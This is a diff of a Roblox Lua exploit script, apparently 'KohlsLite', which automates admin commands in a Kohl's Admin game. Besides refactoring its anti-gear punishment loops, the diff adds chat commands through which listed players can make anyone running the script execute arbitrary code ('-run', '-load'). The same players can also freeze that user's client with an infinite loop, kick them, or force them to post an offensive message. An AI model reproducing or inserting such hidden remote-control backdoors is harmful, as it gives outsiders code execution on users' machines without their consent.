+								Chat(prefix .. "regen")
+							else end
+						end
+					end
+				end
 
-                if v.Backpack:FindFirstChild("HotPotato") or v.Character:FindFirstChild("HotPotato") then -- doesn't even kick anymore lmao
-                               if v == game.Players.LocalPlayer and antikick2 == true then
-                                game.Players.LocalPlayer:FindFirstChild("HotPotato"):Destroy()
-                                game.Players.LocalPlayer:FindFirstChild("HotPotato"):Destroy()
-                                Chat("ungear me")
-                               end
-                    end
+				if workspace:FindFirstChild(tool) then
+					Chat("ungear others")
+					Chat("punish others")
+					Chat("clr")
+					Chat(prefix .. "regen")
+				end
+		end
 
-                    for i, gear in pairs(v.Backpack:GetChildren()) do
-                            if gear:IsA("Tool") and antigear2 == true then
-                                       if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
-                                        Chat("ungear "..v.Name)
-                                        Chat("punish "..v.Name)
-                                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use tools because of anti gear (2). \n\n\n")
-                                end
-                            end
-                           end
+		for i, tool in attachTools do
+				for i, v in game.Players:GetPlayers() do
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Backpack:FindFirstChild(tool) then
+							if antiattach2 then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							end
+						end
+					end
 
-                    for i, gear in pairs(v.Backpack:GetChildren()) do
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Character and v.Character:FindFirstChild(tool) then
+							if antiattach2 then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							end
+						end
+					end
+				end
+
+				if workspace:FindFirstChild(tool) then
+					Chat("ungear others")
+					Chat("punish others")
+					Chat("clr")
+					Chat(prefix .. "regen")
+				end
+		end
+
+		for i, tool in nogearTools do
+				for i, v in game.Players:GetPlayers() do
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Backpack:FindFirstChild(tool) then
+							if antigb then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							end
+						end
+					end
+
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Character and v.Character:FindFirstChild(tool) then
+							if antigb then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							end
+						end
+					end
+				end
+
+				if workspace:FindFirstChild(tool) then
+					Chat("ungear others")
+					Chat("punish others")
+					Chat("clr")
+					Chat(prefix .. "regen")
+				end
+		end
+
+		for i, tool in colourTools do
+				for i, v in game.Players:GetPlayers() do
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Backpack:FindFirstChild(tool) then
+							if antipaint then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							end
+						end
+					end
+
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Character and v.Character:FindFirstChild(tool) then
+							if antipaint then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							end
+						end
+					end
+				end
+
+				if workspace:FindFirstChild(tool) then
+					Chat("ungear others")
+					Chat("punish others")
+					Chat("clr")
+					Chat(prefix .. "regen")
+				end
+		end
+
+		for i, tool in miscTools do
+				for i, v in game.Players:GetPlayers() do
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Backpack:FindFirstChild(tool) then
+							if noblt then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							end
+						end
+					end
+
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Character and v.Character:FindFirstChild(tool) then
+							if noblt then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							end
+						end
+					end
+				end
+
+				if workspace:FindFirstChild(tool) then
+					Chat("ungear others")
+					Chat("punish others")
+					Chat("clr")
+					Chat(prefix .. "regen")
+				end
+		end
+
+		for i, tool in ninejntools do
+				for i, v in game.Players:GetPlayers() do
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Backpack:FindFirstChild(tool) then
+							if antiraygun then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							end
+						end
+					end
+
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Character and v.Character:FindFirstChild(tool) then
+							if antiraygun then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							end
+						end
+					end
+				end
+
+				if workspace:FindFirstChild(tool) then
+					Chat("ungear others")
+					Chat("punish others")
+					Chat("clr")
+					Chat(prefix .. "regen")
+				end
+		end
+
+		for i, tool in crashToolsLP do
+				for i, v in game.Players:GetPlayers() do
+					if v.Name == game.Players.LocalPlayer.Name then
+						if v.Backpack:FindFirstChild(tool) then
+							if antikick2 then
+								tool:Destroy()
+							end
+						end
+					end
+
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Character and v.Character:FindFirstChild(tool) then
+							if antikick2 then
+								tool:Destroy()
+							end
+						end
+					end
+				end
+		end
+
+                for i, gear in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                             if gear:IsA("Tool") and antitoolm == true then
-                                       if v.Name == game.Players.LocalPlayer.Name then
                                         gear:Destroy()
-                                end
                             end
-                           end
-            end
-     end 
+        	end
+
 end)
 
 -- anti tp 
@@ -7630,274 +7786,6 @@ game:GetService("RunService").RenderStepped:Connect(function()
 		end
 	end
 end)
-
--- ANTIS FOR CRASHING ATTACHING GEARBANNING AND HAVING A GEAR
-local crashTools = {"OrinthianSwordAndShield", "VampireVanquisher","Emerald Knights of the Seventh Sanctum Sword and Shield"}
-local attachTools = {"IvoryPeriastron"}
-local nogearTools = {"PortableJustice"}
-local colourTools = {"PaintBucket", "SubspaceTripmine"}
-local miscTools = {"DaggerofShatteredDimensions", "SledgeHammer", "AR", "Transmorpher"}
-local ninejntools = {"HyperlaserGun","Transmorpher","ConfusoRay-672"}
-
-function warnCrash(player, toolName)
-        local isB,spe = bypassattemptcheck(player.Name)
-        if isB == true then
-                       Chat("ungear " .. spe)
-                       Chat("punish " .. spe)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti crash. \n\n\n")
-                      Chat("clr")
-        else
-                Chat("ungear " .. player.Name)
-                       Chat("punish " .. player.Name)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti crash. \n\n\n")
-                      Chat("clr") -- drop crash prevention
-        end
-        if autoblvgc == true and not table.find(blacklist, player.Name) then
-                 table.insert(blacklist, player.Name)
-        end
-end
-
-function warnGear(player, toolName)
-        local isB,spe = bypassattemptcheck(player.Name)
-        if isB == true then
-                       Chat("ungear " .. spe)
-                       Chat("punish " .. spe)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName.Name .. "  because of anti gear. \n\n\n")
-                      Chat("clr")
-        else
-                Chat("ungear " .. player.Name)
-                       Chat("punish " .. player.Name)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName.Name .. "  because of anti gear. \n\n\n")
-                      Chat("clr")
-        end
-end
-
-function warnAGBan(player, toolName)
-        local isB,spe = bypassattemptcheck(player.Name)
-        if isB == true then
-                       Chat("ungear " .. spe)
-                       Chat("punish " .. spe)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti gearban. \n\n\n")
-                      Chat("clr")
-        else
-                Chat("ungear " .. player.Name)
-                       Chat("punish " .. player.Name)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti gearban. \n\n\n")
-                      Chat("clr")
-        end
-end
-
-function warnAttach(player, toolName)
-        local isB,spe = bypassattemptcheck(player.Name)
-        if isB == true then
-                       Chat("ungear " .. spe)
-                       Chat("punish " .. spe)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti attach. \n\n\n")
-                      Chat("clr")
-        else
-                Chat("ungear " .. player.Name)
-                       Chat("punish " .. player.Name)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti attach. \n\n\n")
-                      Chat("clr")
-        end
-end
-
-function warnPaint(player, toolName)
-        local isB,spe = bypassattemptcheck(player.Name)
-        if isB == true then
-                       Chat("ungear " .. spe)
-                       Chat("punish " .. spe)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti paint. \n\n\n")
-                      Chat("clr")
-        else
-                Chat("ungear " .. player.Name)
-                       Chat("punish " .. player.Name)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of anti paint. \n\n\n")
-                      Chat("clr")
-        end
-end
-
-function warn9jn(player, toolName)
-        local isB,spe = bypassattemptcheck(player.Name)
-        if isB == true then
-                       Chat("ungear " .. spe)
-                       Chat("punish " .. spe)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of 9jn. \n\n\n")
-                      Chat("clr")
-        else
-                Chat("ungear " .. player.Name)
-                       Chat("punish " .. player.Name)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because of 9jn. \n\n\n")
-                      Chat("clr")
-        end
-end
-
-function warnMisc(player, toolName)
-        local isB,spe = bypassattemptcheck(player.Name)
-        if isB == true then
-                       Chat("ungear " .. spe)
-                       Chat("punish " .. spe)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because it's a blacklisted tool. \n\n\n")
-                      Chat("clr")
-        else
-                Chat("ungear " .. player.Name)
-                       Chat("punish " .. player.Name)
-                       Chat("h \n\n\n Sorry, " .. player.Name .. ", you cannot use " .. toolName .. " because it's a blacklisted tool. \n\n\n")
-                      Chat("clr")
-        end
-end
-
-function checkPlayerBackpack(player)
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _, toolName in ipairs(crashTools) do
-            local tool = backpack:FindFirstChild(toolName)
-            if tool and anticrash then
-                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
-                   warnCrash(player, toolName)
-                   break
-                end
-            end
-        end
-    end
-end
-
-function check9jn(player)
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _, toolName in ipairs(ninejntools) do
-            local tool = backpack:FindFirstChild(toolName)
-            if tool and antiraygun then
-                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
-                   warn9jn(player, toolName)
-                   break
-                end
-            end
-        end
-    end
-end
-
-function checkPlayerAGBackpack(player)
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _, toolName in ipairs(nogearTools) do
-            local tool = backpack:FindFirstChild(toolName)
-            if tool and antigb then
-                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
-                   warnAGBan(player, toolName)
-                   break
-                end
-            end
-        end
-    end
-end
-
-function checkPlayerGBackpack(player)
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _, toolName in ipairs(player.Backpack:GetChildren()) do
-                if toolName:IsA("Tool") and antigear then
-                     if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
-                        warnGear(player, toolName)
-                        break
-                     end
-            end
-        end
-    end
-end
-
-function checkPlayerATTBackpack(player)
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _, toolName in ipairs(attachTools) do
-            local tool = backpack:FindFirstChild(toolName)
-            if tool and antiattach2 then
-                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
-                   warnAttach(player, toolName)
-                   break
-                end
-            end
-        end
-    end
-end
-
-function checkPlayerPBackpack(player)
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _, toolName in ipairs(colourTools) do
-            local tool = backpack:FindFirstChild(toolName)
-            if tool and antipaint then
-                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
-                   warnPaint(player, toolName)
-                   break
-                end
-            end
-        end
-    end
-end
-
-function checkPlayerMiBackpack(player)
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack then
-        for _, toolName in ipairs(miscTools) do
-            local tool = backpack:FindFirstChild(toolName)
-            if tool and noblt then
-                if player.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, player.Name) and not table.find(pgwl, player.Name)) then
-                   warnMisc(player, toolName)
-                   break
-                end
-            end
-        end
-    end
-end
-
-game.Players.PlayerAdded:Connect(function(player)
-    task.wait(0)
-    player.CharacterAdded:Connect(function(character)
-            checkPlayerBackpack(player)
-            checkPlayerGBackpack(player)
-            checkPlayerAGBackpack(player)  
-            checkPlayerATTBackpack(player)
-            checkPlayerPBackpack(player)
-            checkPlayerMiBackpack(player)
-            check9jn(player)
-    end)
-            checkPlayerBackpack(player)
-            checkPlayerGBackpack(player)
-            checkPlayerAGBackpack(player)
-            checkPlayerATTBackpack(player)
-            checkPlayerPBackpack(player)
-            checkPlayerMiBackpack(player)
-            check9jn(player)
-end)
-
-game:GetService("RunService").Heartbeat:Connect(function()
-    task.wait(0)
-    for _, player in ipairs(game.Players:GetPlayers()) do
-        if player.Character then
-            checkPlayerBackpack(player)
-            checkPlayerGBackpack(player)
-            checkPlayerAGBackpack(player)
-            checkPlayerATTBackpack(player)
-            checkPlayerPBackpack(player)
-            checkPlayerMiBackpack(player)
-            check9jn(player)
-        end
-    end
-end)
-
-for _, player in ipairs(game.Players:GetPlayers()) do
-    task.wait(0)
-    if player.Character then
-            checkPlayerBackpack(player)
-            checkPlayerGBackpack(player)
-            checkPlayerAGBackpack(player)
-            checkPlayerATTBackpack(player)
-            checkPlayerPBackpack(player)
-            checkPlayerMiBackpack(player)
-            check9jn(player)
-    end
-end
 
 -- CHAT F*CK
 function ChatFudge()
@@ -8296,15 +8184,29 @@ v.Chatted:Connect(function(msg)
                                 Speak("I use KohlsLite!")
                 end
 
+        	if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                Speak("atprog groomed me")
+                end
 
                 if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                                 pcall(function()
-                                        game.Players.LocalPlayer:Kick("SkiddyProgrammer {kohlslite owner} kicked you from the game!")
+                                        game.Players.LocalPlayer:Kick("A KohlsLite collaborator kicked you from the game!")
                                 end)
                 end  
 
+                if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                pcall(function()
+                                        game.Players.LocalPlayer:Kick("a kohlslite admin kicked you!")
+                                end)
+                end
+
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                                    Remind("You have been warned by KohlsLite owner!")
+                                    Remind("You have been warned by a KohlsLite collaborator!")
+                end
+
+
+                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                    Remind("You have been WARNED!")
                 end
 
                 if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
@@ -8312,6 +8214,27 @@ v.Chatted:Connect(function(msg)
                                 -- game:Shutdown()
                 end
 
+                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                                     while true do end
+                                -- game:Shutdown()
+                end
+
+
+           	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+        			Execute(string.sub(msg, 6))
+    		end
+
+           	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+        			Execute(string.sub(msg, 6))
+    		end
+
+           	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
+        			GExecute(string.sub(msg, 7))
+    		end
+
+           	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+        			GExecute(string.sub(msg, 7))
+    		end
 
                 end)
 -- ADMIN
@@ -10295,7 +10218,7 @@ function onPlayerAdded(player)
     end
 
     if (player.Name == "atprog" or player.Name == "IceStuds") and player.Name ~= game.Players.LocalPlayer then
-        Chat("h \n\n\n atprog [OWNER OF PR] joined the server! \n\n\n")
+        Chat("h \n\n\n atprog [KohlsLite Admin] joined the server! \n\n\n")
         print("atprog [OWNER OF PR] joined the server!")
        end
 
@@ -10420,11 +10343,11 @@ UserInputService.WindowFocusReleased:Connect(function()
                     Chat("name me ["..game.Players.LocalPlayer.Name.."]: AFK")
                     Chat("ff me")
                     Chat("god me")
-		    if autoff == false then
-		    	tempautoff = true
+		    if autos.autoff == false then
+		    	autos.tempautoff = true
 		    end
-		    if autogod == false then
-		    	tempautogod = true
+		    if autos.autogod == false then
+		    	autos.tempautogod = true
 		    end
             end
 end)
@@ -10433,8 +10356,8 @@ UserInputService.WindowFocused:Connect(function()
         task.wait(0)
             if autoafk == true then
                 Chat("reset me")
-		tempautoff = false
-		tempautogod = false
+		autos.tempautoff = false
+		autos.tempautogod = false
                 Chat("unff me")
                 Chat("ungod me")
             end
@@ -12729,13 +12652,11 @@ if table.find(unexecuteables, game.Players.LocalPlayer.Name) then
 end
 
 --[[
-Ideas;
+Things to add/fix. Feel free to fix these and send the code and I'll credit you
 -> Visualiser and drawer to kohlslite
 -> part builder
 -> object mover (cmd pi version)
--> literally nothin else i think
--> oh yeah i forgot... fix the antifling
--> but i can't do that for a while cuz no PC
--> maybe during summer i hope
--> and fix pingwait idk why it doesn't work :(
+-> fix the antifling
+-> fix ncontrol
+-> i will finish during summer break (next month, july)
 ]]
